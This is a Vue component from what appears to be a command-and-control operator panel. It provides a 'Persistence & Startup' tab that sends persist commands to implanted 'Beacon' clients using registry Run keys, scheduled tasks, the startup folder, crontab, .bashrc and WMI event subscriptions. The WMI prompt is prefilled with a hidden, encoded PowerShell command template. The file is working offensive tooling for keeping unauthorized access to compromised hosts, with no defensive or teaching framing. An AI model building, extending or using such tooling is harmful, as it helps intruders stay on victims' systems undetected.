<template>
  <div class="cs-startup-view cs-font-ui">
    <!-- CS Toolbar -->
    <div class="cs-startup-toolbar">
      <div class="toolbar-title-group">
        <span class="toolbar-title">{{ i18nStore.tl('开机启动（持久化驻留）', 'Persistence & Startup') }}</span>
        <span class="toolbar-hint">{{ i18nStore.tl('选择持久化方式将客户端植入目标系统，执行结果在命令控制查看', 'Select persistence method to maintain access across reboots') }}</span>
      </div>
    </div>

    <!-- Main Body -->
    <div class="cs-startup-body" v-loading="!!loading">
      <div class="cs-startup-section">
        <div class="cs-form-row">
          <label class="cs-form-label">{{ i18nStore.tl('服务 / 任务名称:', 'Service / Task Name:') }}</label>
          <el-input
            v-model="customName"
            :placeholder="i18nStore.tl('自定义名称（可选，默认 TshellSvc）', 'Custom Name (optional, default TshellSvc)')"
            style="width: 320px"
            clearable
          />
        </div>
      </div>

      <!-- Windows Persistence Group -->
      <div class="cs-group-box">
        <div class="group-title">Windows {{ i18nStore.tl('持久化策略', 'Persistence Methods') }}</div>
        <div class="group-content">
          <div class="btn-grid">
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('registry')"
            >
              {{ loading === 'registry' ? (i18nStore.tl('执行中...', 'Running...')) : (i18nStore.tl('注册表 Run 键 (Registry Run)', 'Registry Run Key')) }}
            </button>
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('schtasks')"
            >
              {{ loading === 'schtasks' ? (i18nStore.tl('执行中...', 'Running...')) : (i18nStore.tl('计划任务 (Scheduled Tasks)', 'Scheduled Task')) }}
            </button>
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="persist('startup')"
            >
              {{ loading === 'startup' ? (i18nStore.tl('执行中...', 'Running...')) : (i18nStore.tl('启动文件夹 (Startup Folder)', 'Startup Folder')) }}
            </button>
            <button
              class="cs-btn cs-btn-primary"
              :disabled="loading !== ''"
              @click="promptWmiPersist"
            >
              {{ i18nStore.tl('WMI 事件订阅 (WMI)', 'WMI Subscription') }}
            </button>
          </div>
          <div class="group-tip">
            {{ i18nStore.tl('说明：注册表 Run 键无需管理员权限；计划任务与启动文件夹建议提权后执行。', 'Note: Registry Run key does not require Administrator rights; Tasks and Startup folder benefit from elevated privileges.') }}
          </div>
        </div>
      </div>

      <!-- Linux Persistence Group -->
      <div class="cs-group-box">
        <div class="group-title">Linux {{ i18nStore.tl('持久化策略', 'Persistence Methods') }}</div>
        <div class="group-content">
          <div class="btn-grid">
            <button
              class="cs-btn"
              :disabled="loading !== ''"
              @click="persist('cron')"
            >
              {{ loading === 'cron' ? (i18nStore.tl('执行中...', 'Running...')) : (i18nStore.tl('定时任务 (Crontab)', 'Crontab')) }}
            </button>
            <button
              class="cs-btn"
              :disabled="loading !== ''"
              @click="persist('bashrc')"
            >
              {{ loading === 'bashrc' ? (i18nStore.tl('执行中...', 'Running...')) : (i18nStore.tl('环境脚本 (.bashrc)', 'Bashrc Profile')) }}
            </button>
          </div>
          <div class="group-tip">
            {{ i18nStore.tl('说明：Linux 下 cron 与 bashrc 默认持久化至当前登录用户环境变量。', 'Note: Linux cron and bashrc persistence take effect for the current user profile.') }}
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, ref } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import ClientAPI from '@/api/clients'
import { useI18nStore } from '@/stores/i18n'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const injectedUid = inject('realUid', null) as any
const getUid = () => {
  const v = injectedUid && injectedUid.value ? String(injectedUid.value) : ''
  return v && v.length > 10 ? v : ''
}

const loading = ref('')
const customName = ref('')

function promptWmiPersist() {
  const uid = getUid()
  if (!uid) return
  ElMessageBox.prompt(
    isZh.value ? 'WMI 持久化触发命令:' : 'Command triggered by WMI persistence:',
    isZh.value ? 'WMI 持久化' : 'WMI Persistence',
    { confirmButtonText: isZh.value ? '添加' : 'Add', cancelButtonText: isZh.value ? '取消' : 'Cancel', inputValue: 'powershell -nop -w hidden -enc ' },
  ).then(async ({ value }) => {
    const cmd = (value || '').trim()
    if (!cmd) {
      ElMessage.warning(isZh.value ? '命令为空' : 'Command is empty')
      return
    }
    loading.value = 'wmi'
    try {
      await ClientAPI.send_commands({ uid, command: `wmi_persist add ${cmd}` })
      ElMessage.success(isZh.value ? '已下发 WMI 持久化' : 'WMI persistence tasked')
    } finally {
      loading.value = ''
    }
  }).catch(() => {})
}

const persist = async (method: string) => {
  const uid = getUid()
  if (!uid) {
    ElMessage.warning(isZh.value ? '客户端未就绪' : 'Beacon session not ready')
    return
  }
  loading.value = method
  const name = customName.value.trim()
  const cmd = name ? `persist ${method} ${name}` : `persist ${method}`
  try {
    await ClientAPI.send_commands({ uid, command: cmd })
    ElMessage.success(isZh.value ? `已下发持久化指令: ${method}，请在命令控制查看结果` : `Persistence command dispatched: ${method}`)
  } catch (e) {
    ElMessage.error(isZh.value ? '下发失败' : 'Failed to dispatch command')
  } finally {
    loading.value = ''
  }
}
</script>

<style scoped>
.cs-startup-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.cs-startup-toolbar {
  max-width: 760px;
  width: 100%;
  margin-left: auto;
  margin-right: auto;
  height: 48px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-card-border);
  display: flex;
  align-items: center;
  padding: 0 16px;
  flex-shrink: 0;
}

.toolbar-title {
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.toolbar-hint {
  font-size: 13px;
  color: var(--cs-text-dim);
  margin-left: 12px;
}

.cs-startup-body {
  padding: 16px;
  display: flex;
  flex-direction: column;
  gap: 16px;
  max-width: 760px;
  /* 限宽后居中对齐，与其它页签的居中卡片一致（标题栏同样限宽，保持同一列） */
  width: 100%;
  margin-left: auto;
  margin-right: auto;
  min-height: 320px;
  width: 100%;
  box-sizing: border-box;
  overflow-y: auto;
}

.cs-startup-section {
  background: var(--cs-card-bg);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  padding: 16px;
}

.cs-form-row {
  display: flex;
  align-items: center;
  gap: 12px;
}

.cs-form-label {
  font-size: 14px;
  color: var(--cs-text);
  font-weight: 500;
  width: 150px;
  flex-shrink: 0;
}

.cs-group-box {
  background: var(--cs-card-bg);
  border: 1px solid var(--cs-card-border);
  border-radius: 8px;
  overflow: hidden;
}

.group-title {
  height: 38px;
  display: flex;
  align-items: center;
  padding: 0 12px;
  font-size: 14px;
  font-weight: 600;
  color: var(--cs-text-bright);
  border-bottom: 1px solid var(--cs-card-border);
}

.group-content {
  padding: 12px;
}

.btn-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}

.group-tip {
  margin-top: 12px;
  font-size: 13px;
  color: var(--cs-text-dim);
  line-height: 1.6;
}
</style>
